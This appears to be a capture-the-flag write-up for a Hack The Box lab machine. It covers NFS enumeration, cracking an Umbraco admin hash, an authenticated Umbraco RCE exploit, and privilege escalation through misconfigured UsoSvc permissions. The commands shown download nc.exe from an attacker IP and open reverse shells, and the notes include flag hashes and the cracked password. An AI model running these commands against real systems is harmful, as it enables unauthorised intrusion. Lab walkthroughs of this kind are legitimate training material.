# Summary
- Takeaways:
    - abusing misconfigured service privileges to replace the binary they run can lead to privilege escalation
- User: mount NFS and search for admin password in retrieved binary, use authenticated RCE exploit in Umbraco
- Root: misconfigured privileges on UsoSvc service allow for binary execution as `nt authority\system`

# Details
### User: 6646cb937970c1d84b764598f9091132
- Nmap scan reveals ports 21, 80, 111, 135, 139, 445, 2049, 5985, 47001, and 49664-49680 are open
- port 2049 hosts an NFS share that can be checked with `showmount -e remote.htb` and then mounted with `sudo mount -t nfs remote.htb:/site_backups ./site_backups`
- binary file located at `site_backup/App_Data/Umbraco.sdf` contains the hash `b8be16afba8c314ad33d812f22a04991b90e2aaa` and information relating to a login attempt with `admin@htb.local` than can all be viewed with `strings`
- cracking the hash reveals the password for `admin@htb.local` to be be `baconandcheese`
    - https://crackstation.net/
- use Umbraco authenticated RCE exploit to execute commands
    - https://github.com/noraj/Umbraco-RCE
- upload `nc.exe` and spawn a reverse shell
    - `python umbraco-exploit.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c powershell.exe -a 'cd /Windows/Temp; curl 10.10.14.41:8000/nc.exe -o nc.exe'`
    - `python umbraco-exploit.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c powershell.exe -a '/Windows/Temp/nc.exe 10.10.14.41 9405 -e powershell.exe'`

### Root: 9f8e41d45a0763b247eecc22e06ccd35
- running `PowerUp.ps1` reveals that the `UsoSvc` service has improperly configured access rights
    - upload `PowerUp.ps1` to target and then import its function with `import-module ./PowerUp.ps1`
- attempting to replace the `binPath` binary and then restarting the service according to the `payloadallthethings` cheatsheet doesn't work
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20:/Windows%20-%20Privilege%20Escalation.md#eop---incorrect-permissions-in-services
- attempting to restart the service with `wmic service NAMEOFSERVICE call startservice` also doesn't work
    - https://guif.re/windowseop
- `PowerUp.ps1` function `Invoke-ServiceAbuse -name 'UsoSvc' -command "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.41 9406"` works, but unsure why it does and other methods don't
- also a potential exploit in TeamViewer service
